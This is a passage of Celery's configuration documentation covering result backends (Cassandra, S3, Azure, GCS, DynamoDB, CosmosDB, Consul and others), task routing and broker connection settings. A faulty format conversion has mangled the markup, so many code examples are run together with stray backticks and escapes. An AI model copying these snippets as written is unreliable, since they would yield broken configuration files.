Additional configuration `` ` ~~~~~~~~~~~~~~~~~~~~~~~~  The Cassandra driver, when establishing the connection, undergoes a stage of negotiating the protocol version with the server(s). Similarly, a load-balancing policy is automatically supplied (by default ``DCAwareRoundRobinPolicy`, which in turn has a`local\_dc``setting, also determined by the driver upon connection). When possible, one should explicitly provide these in the configuration: moreover, future versions of the Cassandra driver will require at least the load-balancing policy to be specified (using `execution profiles <https://docs.datastax.com/en/developer/python-driver/3.25/execution_profiles/>`_, as shown below).  A full configuration for the Cassandra backend would thus have the following additional lines:``\`python from cassandra.policies import DCAwareRoundRobinPolicy from cassandra.cluster import ExecutionProfile from cassandra.cluster import EXEC\_PROFILE\_DEFAULT myEProfile = ExecutionProfile( load\_balancing\_policy=DCAwareRoundRobinPolicy( local\_dc='datacenter1', \# replace with your DC name ) ) cassandra\_options = { 'protocol\_version': 5, \# for Cassandra 4, change if needed 'execution\_profiles': {EXEC\_PROFILE\_DEFAULT: myEProfile}, }

And similarly for Astra DB:

``` python
from cassandra.policies import DCAwareRoundRobinPolicy
from cassandra.cluster import ExecutionProfile
from cassandra.cluster import EXEC_PROFILE_DEFAULT
myEProfile = ExecutionProfile(
  load_balancing_policy=DCAwareRoundRobinPolicy(
    local_dc='europe-west1',  # for Astra DB, region name = dc name
  )
)
cassandra_options = {
  'protocol_version': 4,      # for Astra DB
  'execution_profiles': {EXEC_PROFILE_DEFAULT: myEProfile},
}
```

<div id="conf-s3-result-backend">

S3 backend settings `` ` -------------------  > **Note** >      This s3 backend driver requires :pypi:`s3`.      To install, use :command:`s3`: ``\`console $ pip install celery\[s3\]

</div>

> See \[bundles\](\#bundles) for information on combining multiple extension requirements.

This backend requires the following configuration directives to be set.

<div class="setting">

s3\_access\_key\_id

</div>

`s3_access_key_id` `` ` ~~~~~~~~~~~~~~~~~~~~  Default: None.  The s3 access key id. For example::      s3_access_key_id = 'acces_key_id'  .. setting:: s3_secret_access_key ``s3\_secret\_access\_key`~~~~~~~~~~~~~~~~~~~~~~~~  Default: None.  The s3 secret access key. For example::      s3_secret_access_key = 'acces_secret_access_key'  .. setting:: s3_bucket`s3\_bucket`~~~~~~~~~~~~~  Default: None.  The s3 bucket name. For example::      s3_bucket = 'bucket_name'  .. setting:: s3_base_path`s3\_base\_path`~~~~~~~~~~~~~~~~  Default: None.  A base path in the s3 bucket to use to store result keys. For example::      s3_base_path = '/prefix'  .. setting:: s3_endpoint_url`s3\_endpoint\_url`~~~~~~~~~~~~~~~~~~~  Default: None.  A custom s3 endpoint url. Use it to connect to a custom self-hosted s3 compatible backend (Ceph, Scality...). For example::      s3_endpoint_url = 'https://.s3.custom.url'  .. setting:: s3_region`s3\_region`~~~~~~~~~~~~~  Default: None.  The s3 aws region. For example::      s3_region = 'us-east-1'  Example configuration ~~~~~~~~~~~~~~~~~~~~~`\`python s3\_access\_key\_id = 's3-access-key-id' s3\_secret\_access\_key = 's3-secret-access-key' s3\_bucket = 'mybucket' s3\_base\_path = '/celery\_result\_backend' s3\_endpoint\_url = '<https://endpoint_url>'

<div id="conf-azureblockblob-result-backend">

Azure Block Blob backend settings `` ` ---------------------------------  To use `AzureBlockBlob`_ as the result backend you simply need to configure the :setting:`result_backend` setting with the correct URL.  The required URL format is ``azureblockblob://`followed by the storage connection string. You can find the storage connection string in the`Access Keys`pane of your storage account resource in the Azure Portal.  Example configuration ~~~~~~~~~~~~~~~~~~~~~`\`python result\_backend = 'azureblockblob://DefaultEndpointsProtocol=https;AccountName=somename;AccountKey=Lou...bzg==;EndpointSuffix=core.windows.net'

</div>

<div class="setting">

azureblockblob\_container\_name

</div>

`azureblockblob_container_name` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: celery.  The name for the storage container in which to store the results.  .. setting:: azureblockblob_base_path ``azureblockblob\_base\_path`~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.1  Default: None.  A base path in the storage container to use to store result keys. For example::      azureblockblob_base_path = 'prefix/'  .. setting:: azureblockblob_retry_initial_backoff_sec`azureblockblob\_retry\_initial\_backoff\_sec`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 2.  The initial backoff interval, in seconds, for the first retry. Subsequent retries are attempted with an exponential strategy.  .. setting:: azureblockblob_retry_increment_base`azureblockblob\_retry\_increment\_base`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 2.  .. setting:: azureblockblob_retry_max_attempts`azureblockblob\_retry\_max\_attempts`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 3.  The maximum number of retry attempts.  .. setting:: azureblockblob_connection_timeout`azureblockblob\_connection\_timeout`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 20.  Timeout in seconds for establishing the azure block blob connection.  .. setting:: azureblockblob_read_timeout`azureblockblob\_read\_timeout``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 120.  Timeout in seconds for reading of an azure block blob.  .. _conf-gcs-result-backend:  GCS backend settings --------------------  > **Note** >      This gcs backend driver requires :pypi:`google-cloud-storage` and :pypi:`google-cloud-firestore`.      To install, use :command:`gcs`:``\`console $ pip install celery\[gcs\]

> See \[bundles\](\#bundles) for information on combining multiple extension requirements.

GCS could be configured via the URL provided in `result_backend`, for example:

    result_backend = 'gs://mybucket/some-prefix?gcs_project=myproject&ttl=600'
    result_backend = 'gs://mybucket/some-prefix?gcs_project=myproject?firestore_project=myproject2&ttl=600'

This backend requires the following configuration directives to be set:

<div class="setting">

gcs\_bucket

</div>

`gcs_bucket` `` ` ~~~~~~~~~~~~~~  Default: None.  The gcs bucket name. For example::      gcs_bucket = 'bucket_name'  .. setting:: gcs_project ``gcs\_project`~~~~~~~~~~~~~~~  Default: None.  The gcs project name. For example::      gcs_project = 'test-project'  .. setting:: gcs_base_path`gcs\_base\_path`~~~~~~~~~~~~~~~~~  Default: None.  A base path in the gcs bucket to use to store all result keys. For example::      gcs_base_path = '/prefix'`gcs\_ttl`~~~~~~~~~~~  Default: 0.  The time to live in seconds for the results blobs. Requires a GCS bucket with "Delete" Object Lifecycle Management action enabled. Use it to automatically delete results from Cloud Storage Buckets.  For example to auto remove results after 24 hours::      gcs_ttl = 86400`gcs\_threadpool\_maxsize`~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 10.  Threadpool size for GCS operations. Same value defines the connection pool size. Allows to control the number of concurrent operations. For example::      gcs_threadpool_maxsize = 20`firestore\_project``~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: gcs_project.  The Firestore project for Chord reference counting. Allows native chord ref counts. If not specified defaults to :setting:`gcs_project`. For example::      firestore_project = 'test-project2'  Example configuration ~~~~~~~~~~~~~~~~~~~~~``\`python gcs\_bucket = 'mybucket' gcs\_project = 'myproject' gcs\_base\_path = '/celery\_result\_backend' gcs\_ttl = 86400

<div id="conf-elasticsearch-result-backend">

Elasticsearch backend settings `` ` ------------------------------  To use `Elasticsearch`_ as the result backend you simply need to configure the :setting:`result_backend` setting with the correct URL.  Example configuration ~~~~~~~~~~~~~~~~~~~~~ ``\`python result\_backend = 'elasticsearch://example.com:9200/index\_name/doc\_type'

</div>

<div class="setting">

elasticsearch\_retry\_on\_timeout

</div>

`elasticsearch_retry_on_timeout` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: `False`  Should timeout trigger a retry on different node?  .. setting:: elasticsearch_max_retries ``elasticsearch\_max\_retries`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 3.  Maximum number of retries before an exception is propagated.  .. setting:: elasticsearch_timeout`elasticsearch\_timeout`~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 10.0 seconds.  Global timeout,used by the elasticsearch result backend.  .. setting:: elasticsearch_save_meta_as_text`elasticsearch\_save\_meta\_as\_text``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: `True`  Should meta saved as text or as native json. Result is always serialized as text.  .. _conf-dynamodb-result-backend:  AWS DynamoDB backend settings -----------------------------  > **Note** >      The Dynamodb backend requires the :pypi:`boto3` library.      To install this package use :command:`pip`:``\`console $ pip install celery\[dynamodb\]

> See \[bundles\](\#bundles) for information on combining multiple extension requirements.

\> **Warning** \> The Dynamodb backend is not compatible with tables that have a sort key defined.

> If you want to query the results table based on something other than the partition key, please define a global secondary index (GSI) instead.

This backend requires the `result_backend` `` ` setting to be set to a DynamoDB URL::      result_backend = 'dynamodb://aws_access_key_id:aws_secret_access_key@region:port/table?read=n&write=m'  For example, specifying the AWS region and the table name::      result_backend = 'dynamodb://@us-east-1/celery_results'  or retrieving AWS configuration parameters from the environment, using the default table name ( ``celery``) and specifying read and write provisioned throughput::      result_backend = 'dynamodb://@/?read=5&write=5'  or using the `downloadable version <https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.html>`_ of DynamoDB `locally <https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.Endpoint.html>`_::      result_backend = 'dynamodb://@localhost:8000'  or using downloadable version or other service with conforming API deployed on any host::      result_backend = 'dynamodb://@us-east-1'     dynamodb_endpoint_url = 'http://192.168.0.40:8000'  The fields of the DynamoDB URL in``result\_backend`are defined as follows:  #.`aws\_access\_key\_id & aws\_secret\_access\_key``The credentials for accessing AWS API resources. These can also be resolved     by the :pypi:`boto3` library from various sources, as     described `here <http://boto3.readthedocs.io/en/latest/guide/configuration.html#configuring-credentials>`_.  #.``region`The AWS region, e.g.`us-east-1`or`localhost``for the `Downloadable Version <https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.html>`_.     See the :pypi:`boto3` library `documentation <http://boto3.readthedocs.io/en/latest/guide/configuration.html#environment-variable-configuration>`_     for definition options.  #.``port`The listening port of the local DynamoDB instance, if you are using the downloadable version.    If you have not specified the`region`parameter as`localhost`,    setting this parameter has **no effect**.  #.`table`Table name to use. Default is`celery``.     See the `DynamoDB Naming Rules <http://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Limits.html#limits-naming-rules>`_     for information on the allowed characters and length.  #.``read & write`The Read & Write Capacity Units for the created DynamoDB table. Default is`1``for both read and write.     More details can be found in the `Provisioned Throughput documentation <http://docs.aws.amazon.com/amazondynamodb/latest/developerguide/HowItWorks.ProvisionedThroughput.html>`_.  #.``ttl\_seconds`Time-to-live (in seconds) for results before they expire. The default is to     not expire results, while also leaving the DynamoDB table's Time to Live     settings untouched. If`ttl\_seconds`is set to a positive value, results     will expire after the specified number of seconds. Setting`ttl\_seconds``to a negative value means to not expire results, and also to actively     disable the DynamoDB table's Time to Live setting. Note that trying to     change a table's Time to Live setting multiple times in quick succession     will cause a throttling error. More details can be found in the     `DynamoDB TTL documentation <https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/TTL.html>`_  .. _conf-ironcache-result-backend:  IronCache backend settings --------------------------  > **Note** >      The IronCache backend requires the :pypi:`iron_celery` library:      To install this package use :command:`pip`:``\`console $ pip install iron\_celery

IronCache is configured via the URL provided in `result_backend`, for example:

    result_backend = 'ironcache://project_id:token@'

Or to change the cache name:

    ironcache:://project_id:token@/awesomecache

For more information, see: <https://github.com/iron-io/iron_celery>

<div id="conf-couchbase-result-backend">

Couchbase backend settings `` ` --------------------------  > **Note** >      The Couchbase backend requires the :pypi:`couchbase` library.      To install this package use :command:`pip`: ``\`console $ pip install celery\[couchbase\]

</div>

> See \[bundles\](\#bundles) for instructions how to combine multiple extension requirements.

This backend can be configured via the `result_backend` `` ` set to a Couchbase URL: ``\`python result\_backend = 'couchbase://username:<password@host>:port/bucket'

<div class="setting">

couchbase\_backend\_settings

</div>

`couchbase_backend_settings` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: ``{}`(empty mapping).  This is a dict supporting the following keys:  *`host`Host name of the Couchbase server. Defaults to`localhost`.  *`port`The port the Couchbase server is listening to. Defaults to`8091`.  *`bucket`The default bucket the Couchbase server is writing to.     Defaults to`default`.  *`username`User name to authenticate to the Couchbase server as (optional).  *`password``Password to authenticate to the Couchbase server (optional).  .. _conf-arangodb-result-backend:  ArangoDB backend settings --------------------------  > **Note** >      The ArangoDB backend requires the :pypi:`pyArango` library.      To install this package use :command:`pip`:``\`console $ pip install celery\[arangodb\]

> See \[bundles\](\#bundles) for instructions how to combine multiple extension requirements.

This backend can be configured via the `result_backend` `` ` set to a ArangoDB URL: ``\`python result\_backend = 'arangodb://username:<password@host>:port/database/collection'

<div class="setting">

arangodb\_backend\_settings

</div>

`arangodb_backend_settings` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: ``{}`(empty mapping).  This is a dict supporting the following keys:  *`host`Host name of the ArangoDB server. Defaults to`localhost`.  *`port`The port the ArangoDB server is listening to. Defaults to`8529`.  *`database`The default database in the ArangoDB server is writing to.     Defaults to`celery`.  *`collection`The default collection in the ArangoDB servers database is writing to.     Defaults to`celery`.  *`username`User name to authenticate to the ArangoDB server as (optional).  *`password`Password to authenticate to the ArangoDB server (optional).  *`http\_protocol`HTTP Protocol in ArangoDB server connection.     Defaults to`http`.  *`verify`HTTPS Verification check while creating the ArangoDB connection.     Defaults to`False``.  .. _conf-cosmosdbsql-result-backend:  CosmosDB backend settings (experimental) ----------------------------------------  To use `CosmosDB`_ as the result backend, you simply need to configure the :setting:`result_backend` setting with the correct URL.  Example configuration ~~~~~~~~~~~~~~~~~~~~~``\`python result\_backend = 'cosmosdbsql://:{[InsertAccountPrimaryKeyHere}@{InsertAccountNameHere](mailto:InsertAccountPrimaryKeyHere%7D@%7BInsertAccountNameHere)}.documents.azure.com'

<div class="setting">

cosmosdbsql\_database\_name

</div>

`cosmosdbsql_database_name` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: celerydb.  The name for the database in which to store the results.  .. setting:: cosmosdbsql_collection_name ``cosmosdbsql\_collection\_name`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: celerycol.  The name of the collection in which to store the results.  .. setting:: cosmosdbsql_consistency_level`cosmosdbsql\_consistency\_level`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Session.  Represents the consistency levels supported for Azure Cosmos DB client operations.  Consistency levels by order of strength are: Strong, BoundedStaleness, Session, ConsistentPrefix and Eventual.  .. setting:: cosmosdbsql_max_retry_attempts`cosmosdbsql\_max\_retry\_attempts`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 9.  Maximum number of retries to be performed for a request.  .. setting:: cosmosdbsql_max_retry_wait_time`cosmosdbsql\_max\_retry\_wait\_time``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 30.  Maximum wait time in seconds to wait for a request while the retries are happening.  .. _conf-couchdb-result-backend:  CouchDB backend settings ------------------------  > **Note** >      The CouchDB backend requires the :pypi:`pycouchdb` library:      To install this Couchbase package use :command:`pip`:``\`console $ pip install celery\[couchdb\]

> See \[bundles\](\#bundles) for information on combining multiple extension requirements.

This backend can be configured via the `result_backend` `` ` set to a CouchDB URL::      result_backend = 'couchdb://username:password@host:port/container'  The URL is formed out of the following parts:  * ``username`User name to authenticate to the CouchDB server as (optional).  *`password`Password to authenticate to the CouchDB server (optional).  *`host`Host name of the CouchDB server. Defaults to`localhost`.  *`port`The port the CouchDB server is listening to. Defaults to`8091`.  *`container`The default container the CouchDB server is writing to.     Defaults to`default``.  .. _conf-filesystem-result-backend:  File-system backend settings ----------------------------  This backend can be configured using a file URL, for example::      CELERY_RESULT_BACKEND = 'file:///var/celery/results'  The configured directory needs to be shared and writable by all servers using the backend.  If you're trying Celery on a single system you can simply use the backend without any further configuration. For larger clusters you could use NFS, `GlusterFS`_, CIFS, `HDFS`_ (using FUSE), or any other file-system.     .. _conf-consul-result-backend:  Consul K/V store backend settings ---------------------------------  > **Note** >      The Consul backend requires the :pypi:`python-consul2` library:      To install this package use :command:`pip`:``\`console $ pip install python-consul2

The Consul backend can be configured using a URL, for example:

    CELERY_RESULT_BACKEND = 'consul://localhost:8500/'

or:

    result_backend = 'consul://localhost:8500/'

The backend will store results in the K/V store of Consul `` ` as individual keys. The backend supports auto expire of results using TTLs in Consul. The full syntax of the URL is: ``\`text consul://host:port\[?one\_client=1\]

The URL is formed out of the following parts:

  - `host`
    
    > Host name of the Consul server.

  - `port`
    
    > The port the Consul server is listening to.

  - `one_client`
    
    > By default, for correctness, the backend uses a separate client connection per operation. In cases of extreme load, the rate of creation of new connections can cause HTTP 429 "too many connections" error responses from the Consul server when under load. The recommended way to handle this is to enable retries in `python-consul2` using the patch at <https://github.com/poppyred/python-consul2/pull/31>.
    > 
    > Alternatively, if `one_client` is set, a single client connection will be used for all operations instead. This should eliminate the HTTP 429 errors, but the storage of results in the backend can become unreliable.

<div id="conf-messaging">

Message Routing `` ` ---------------  .. _conf-messaging-routing:  .. setting:: task_queues ``task\_queues``~~~~~~~~~~~~~~~  Default: `None` (queue taken from default queue settings).  Most users will not want to specify this setting and should rather use the [automatic routing facilities <routing-automatic>](#automatic-routing-facilities-<routing-automatic>).  If you really want to configure advanced routing, this setting should be a list of `kombu.Queue` objects the worker will consume from.  Note that workers can be overridden this setting via the :option:`-Q <celery worker -Q>` option, or individual queues from this list (by name) can be excluded using the :option:`-X <celery worker -X>` option.  Also see [routing-basics](#routing-basics) for more information.  The default is a queue/exchange/binding key of``celery`, with exchange type`direct``.  See also :setting:`task_routes`  .. setting:: task_routes``task\_routes``~~~~~~~~~~~~~~~  Default: `None`.  A list of routers, or a single router used to route tasks to queues. When deciding the final destination of a task the routers are consulted in order.  A router can be specified as either:  *  A function with the signature``(name, args, kwargs, options, task=None, \**kwargs)\`\`* A string providing the path to a router function. \* A dict containing router specification: Will be converted to a <span class="title-ref">celery.routes.MapRoute</span> instance. \* A list of `(pattern, route)` tuples: Will be converted to a <span class="title-ref">celery.routes.MapRoute</span> instance.

</div>

Examples:

`` `python     task_routes = {         'celery.ping': 'default',         'mytasks.add': 'cpu-bound',         'feed.tasks.*': 'feeds',                           # <-- glob pattern         re.compile(r'(image|video)\.tasks\..*'): 'media',  # <-- regex         'video.encode': {             'queue': 'video',             'exchange': 'media',             'routing_key': 'media.video.encode',         },     }      task_routes = ('myapp.tasks.route_task', {'celery.ping': 'default'})  Where ``myapp.tasks.route\_task`could be:  .. code-block:: python      def route_task(self, name, args, kwargs, options, task=None, **kw):         if task == 'celery.ping':             return {'queue': 'default'}`route\_task`may return a string or a dict. A string then means`<span class="title-ref"> it's a queue name in :setting:\`task\_queues</span>, a dict means it's a custom route.

When sending tasks, the routers are consulted in order. The first router that doesn't return `None` is the route to use. The message options is then merged with the found route settings, where the task's settings have priority.

Example if <span class="title-ref">\~celery.execute.apply\_async</span> has these arguments:

`` `python    Task.apply_async(immediate=False, exchange='video',                     routing_key='video.compress')  and a router returns:  .. code-block:: python      {'immediate': True, 'exchange': 'urgent'}  the final message options will be:  .. code-block:: python      immediate=False, exchange='video', routing_key='video.compress'  (and any default message options defined in the ``<span class="title-ref"> </span>\~celery.app.task.Task\` class)

Values defined in `task_routes` have precedence over values defined in `task_queues` when merging the two.

With the follow settings:

`` `python     task_queues = {         'cpubound': {             'exchange': 'cpubound',             'routing_key': 'cpubound',         },     }      task_routes = {         'tasks.add': {             'queue': 'cpubound',             'routing_key': 'tasks.add',             'serializer': 'json',         },     }  The final routing options for ``tasks.add`will become:  .. code-block:: javascript      {'exchange': 'cpubound',      'routing_key': 'tasks.add',      'serializer': 'json'}  See [routers](#routers) for more examples.  .. setting:: task_queue_max_priority`task\_queue\_max\_priority`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~ :brokers: RabbitMQ

Default: <span class="title-ref">None</span>.

See \[routing-options-rabbitmq-priorities\](\#routing-options-rabbitmq-priorities).

<div class="setting">

task\_default\_priority

</div>

#### `task_default_priority`

  - brokers  
    RabbitMQ, Redis

Default: <span class="title-ref">None</span>.

See \[routing-options-rabbitmq-priorities\](\#routing-options-rabbitmq-priorities).

<div class="setting">

task\_inherit\_parent\_priority

</div>

#### `task_inherit_parent_priority`

  - brokers  
    RabbitMQ

Default: <span class="title-ref">False</span>.

If enabled, child tasks will inherit priority of the parent task.

`` `python     # The last task in chain will also have priority set to 5.     chain = celery.chain(add.s(2) | add.s(2).set(priority=5) | add.s(3))  Priority inheritance also works when calling child tasks from a parent task ``<span class="title-ref"> with \`delay</span> or <span class="title-ref">apply\_async</span>.

See \[routing-options-rabbitmq-priorities\](\#routing-options-rabbitmq-priorities).

<div class="setting">

worker\_direct

</div>

#### `worker_direct`

Default: Disabled.

This option enables so that every worker has a dedicated queue, so that tasks can be routed to specific workers.

The queue name for each worker is automatically generated based on the worker hostname and a `.dq` suffix, using the `C.dq2` exchange.

For example the queue name for the worker with node name `w1@example.com` becomes:

    w1@example.com.dq

Then you can route the task to the worker by specifying the hostname as the routing key and the `C.dq2` exchange:

    task_routes = {
        'tasks.add': {'exchange': 'C.dq2', 'routing_key': 'w1@example.com'}
    }

<div class="setting">

task\_create\_missing\_queues

</div>

#### `task_create_missing_queues`

Default: Enabled.

If enabled (default), any queues specified that aren't defined in `task_queues` will be automatically created. See \[routing-automatic\](\#routing-automatic).

<div class="setting">

task\_default\_queue

</div>

#### `task_default_queue`

Default: `"celery"`.

The name of the default queue used by <span class="title-ref">.apply\_async</span> if the message has no route or no custom queue has been specified.

This queue must be listed in `task_queues`. If `task_queues` isn't specified then it's automatically created containing one queue entry, where this name is used as the name of that queue.

<div class="seealso">

\[routing-changing-default-queue\](\#routing-changing-default-queue)

</div>

<div class="setting">

task\_default\_queue\_type

</div>

#### `task_default_queue_type`

<div class="versionadded">

5.5

</div>

Default: `"classic"`.

This setting is used to allow changing the default queue type for the `task_default_queue` queue. The other viable option is `"quorum"` which is only supported by RabbitMQ and sets the queue type to `quorum` using the `x-queue-type` queue argument.

If the `worker_detect_quorum_queues` setting is enabled, the worker will automatically detect the queue type and disable the global QoS accordingly.

\> **Warning** \> Quorum queues require confirm publish to be enabled. Use `broker_transport_options` to enable confirm publish by setting:

>   - \`\`\`python  
>     broker\_transport\_options = {"confirm\_publish": True}
> 
> For more information, see [RabbitMQ documentation](https://www.rabbitmq.com/docs/quorum-queues#use-cases).

<div class="setting">

task\_default\_exchange

</div>

`task_default_exchange` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Uses the value set for :setting:`task_default_queue`.  Name of the default exchange to use when no custom exchange is specified for a key in the :setting:`task_queues` setting.  .. setting:: task_default_exchange_type ``task\_default\_exchange\_type`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default:`"direct"``.  Default exchange type used when no custom exchange type is specified for a key in the :setting:`task_queues` setting.  .. setting:: task_default_routing_key``task\_default\_routing\_key``~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Uses the value set for :setting:`task_default_queue`.  The default routing key used when no custom routing key is specified for a key in the :setting:`task_queues` setting.  .. setting:: task_default_delivery_mode``task\_default\_delivery\_mode`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default:`"persistent"``.  Can be `transient` (messages not written to disk) or `persistent` (written to disk).  .. _conf-broker-settings:  Broker Settings ---------------  .. setting:: broker_url``broker\_url`~~~~~~~~~~~~~~  Default:`"amqp://"`Default broker URL. This must be a URL in the form of::      transport://userid:password@hostname:port/virtual_host  Only the scheme part (`transport://`) is required, the rest is optional, and defaults to the specific transports default values.  The transport part is the broker implementation to use, and the default is`amqp`, (uses`librabbitmq`if installed or falls back to`pyamqp`). There are also other choices available, including;`<redis://>`,`sqs://`, and`qpid://``.  The scheme can also be a fully qualified path to your own transport implementation::      broker_url = 'proj.transports.MyTransport://localhost'  More than one broker URL, of the same transport, can also be specified. The broker URLs can be passed in as a single string that's semicolon delimited::      broker_url = 'transport://userid:password@hostname:port//;transport://userid:password@hostname:port//'  Or as a list::      broker_url = [         'transport://userid:password@localhost:port//',         'transport://userid:password@hostname:port//'     ]  The brokers will then be used in the :setting:`broker_failover_strategy`.  See [kombu:connection-urls](#kombu:connection-urls) in the Kombu documentation for more information.  .. setting:: broker_read_url  .. setting:: broker_write_url``broker\_read\_url`/`broker\_write\_url``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Taken from :setting:`broker_url`.  These settings can be configured, instead of :setting:`broker_url` to specify different connection parameters for broker connections used for consuming and producing.  Example::      broker_read_url = 'amqp://user:pass@broker.example.com:56721'     broker_write_url = 'amqp://user:pass@broker.example.com:56722'  Both options can also be specified as a list for failover alternates, see :setting:`broker_url` for more information.  .. setting:: broker_failover_strategy``broker\_failover\_strategy`~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default:`"round-robin"`.  Default failover strategy for the broker Connection object. If supplied, may map to a key in 'kombu.connection.failover_strategies', or be a reference to any method that yields a single item from a supplied list.  Example::      # Random failover strategy     def random_failover_strategy(servers):         it = list(servers)  # don't modify callers list         shuffle = random.shuffle         for _ in repeat(None):             shuffle(it)             yield it[0]      broker_failover_strategy = random_failover_strategy  .. setting:: broker_heartbeat`broker\_heartbeat`~~~~~~~~~~~~~~~~~~~~ :transports supported:`pyamqp`Default:`120.0``(negotiated by server).  Note: This value is only used by the worker, clients do not use a heartbeat at the moment.  It's not always possible to detect connection loss in a timely manner using TCP/IP alone, so AMQP defines something called heartbeats that's is used both by the client and the broker to detect if a connection was closed.  If the heartbeat value is 10 seconds, then the heartbeat will be monitored at the interval specified by the :setting:`broker_heartbeat_checkrate` setting (by default this is set to double the rate of the heartbeat value, so for the 10 seconds, the heartbeat is checked every 5 seconds).  .. setting:: broker_heartbeat_checkrate``broker\_heartbeat\_checkrate`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ :transports supported:`pyamqp``Default: 2.0.  At intervals the worker will monitor that the broker hasn't missed too many heartbeats. The rate at which this is checked is calculated by dividing the :setting:`broker_heartbeat` value with this value, so if the heartbeat is 10.0 and the rate is the default 2.0, the check will be performed every 5 seconds (twice the heartbeat sending rate).  .. setting:: broker_use_ssl``broker\_use\_ssl`~~~~~~~~~~~~~~~~~~ :transports supported:`pyamqp`,`redis`Default: Disabled.  Toggles SSL usage on broker connection and SSL settings.  The valid values for this option vary by transport.`pyamqp`__________  If`True``the connection will use SSL with default SSL settings. If set to a dict, will configure SSL connection according to the specified policy. The format used is Python's `ssl.wrap_socket` options.  Note that SSL socket is generally served on a separate port by the broker.  Example providing a client cert and validating the server cert against a custom certificate authority:``\`python import ssl

>   - broker\_use\_ssl = {  
>     'keyfile': '/var/ssl/private/worker-key.pem', 'certfile': '/var/ssl/amqp-server-cert.pem', 'ca\_certs': '/var/ssl/myca.pem', 'cert\_reqs': ssl.CERT\_REQUIRED
> 
> }

<div class="versionadded">

5.1

Starting from Celery 5.1, py-amqp will always validate certificates received from the server and it is no longer required to manually set `cert_reqs` to `ssl.CERT_REQUIRED`.

The previous default, `ssl.CERT_NONE` is insecure and we its usage should be discouraged. If you'd like to revert to the previous insecure default set `cert_reqs` to `ssl.CERT_NONE`

</div>

`redis` `` ` _________   The setting must be a dict with the following keys:  * ``ssl\_cert\_reqs`(required): one of the`SSLContext.verify\_mode`values:     *`ssl.CERT\_NONE`*`ssl.CERT\_OPTIONAL`*`ssl.CERT\_REQUIRED`*`ssl\_ca\_certs`(optional): path to the CA certificate *`ssl\_certfile`(optional): path to the client certificate *`ssl\_keyfile`(optional): path to the client key   .. setting:: broker_pool_limit`broker\_pool\_limit``~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 2.3  Default: 10.  The maximum number of connections that can be open in the connection pool.  The pool is enabled by default since version 2.5, with a default limit of ten connections. This number can be tweaked depending on the number of threads/green-threads (eventlet/gevent) using a connection. For example running eventlet with 1000 greenlets that use a connection to the broker, contention can arise and you should consider increasing the limit.  If set to `None` or 0 the connection pool will be disabled and connections will be established and closed for every use.  .. setting:: broker_connection_timeout``broker\_connection\_timeout``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 4.0.  The default timeout in seconds before we give up establishing a connection to the AMQP server. This setting is disabled when using gevent.  > **Note** >      The broker connection timeout only applies to a worker attempting to     connect to the broker. It does not apply to producer sending a task, see     :setting:`broker_transport_options` for how to provide a timeout for that     situation.  .. setting:: broker_connection_retry``broker\_connection\_retry``~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Enabled.  Automatically try to re-establish the connection to the AMQP broker if lost after the initial connection is made.  The time between retries is increased for each retry, and is not exhausted before :setting:`broker_connection_max_retries` is exceeded.  > **Warning** >      The broker_connection_retry configuration setting will no longer determine     whether broker connection retries are made during startup in Celery 6.0 and above.     If you wish to refrain from retrying connections on startup,     you should set broker_connection_retry_on_startup to False instead.  .. setting:: broker_connection_retry_on_startup``broker\_connection\_retry\_on\_startup``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Enabled.  Automatically try to establish the connection to the AMQP broker on Celery startup if it is unavailable.  The time between retries is increased for each retry, and is not exhausted before :setting:`broker_connection_max_retries` is exceeded.  .. setting:: broker_connection_max_retries``broker\_connection\_max\_retries``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: 100.  Maximum number of retries before we give up re-establishing a connection to the AMQP broker.  If this is set to `None`, we'll retry forever.``broker\_channel\_error\_retry``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 5.3  Default: Disabled.  Automatically try to re-establish the connection to the AMQP broker if any invalid response has been returned.  The retry count and interval is the same as that of `broker_connection_retry`. Also, this option doesn't work when `broker_connection_retry` is `False`.  .. setting:: 